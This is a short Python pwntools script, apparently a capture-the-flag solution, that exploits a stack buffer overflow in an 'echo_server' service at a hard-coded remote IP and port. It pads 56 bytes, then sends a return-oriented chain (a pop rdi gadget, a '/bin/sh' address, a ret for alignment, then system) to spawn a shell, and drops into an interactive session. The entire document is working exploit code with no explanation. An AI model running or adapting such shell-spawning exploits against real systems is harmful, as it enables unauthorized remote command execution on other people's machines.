from pwn import *

ip = "140.110.112.77"
port = 6129

context.arch = "amd64"

r = remote(ip, port)
# r = process("./echo_server")

binsh = 0x6009c0
system = 0x400570
pop_rdi = 0x400923
ret = pop_rdi + 1

payload = b""
payload += b"a" * 56
payload += flat(pop_rdi, binsh, ret, system)

r.sendlineafter(">", payload)

r.interactive()
